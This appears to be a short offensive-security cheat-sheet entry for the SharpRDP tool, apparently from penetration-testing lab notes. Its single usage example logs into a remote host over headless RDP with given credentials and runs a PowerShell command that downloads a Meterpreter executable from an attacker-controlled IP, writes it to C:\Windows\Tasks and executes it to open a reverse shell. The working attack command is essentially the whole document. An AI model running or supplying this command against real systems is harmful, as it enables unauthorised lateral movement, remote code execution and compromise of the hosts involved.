# Name
SharpRDP

## Usage
Headless RDP session
```
# Obtain Meterpreter Reverse shell:
sharprdp.exe computername=appsrv01 command="powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.120/met.exe', 'C:\Windows\Tasks\met.exe'); C:\Windows\Tasks\met.exe" username=corp1\dave password=lab
```

## Source
https://github.com/0xthirteen/SharpRDP

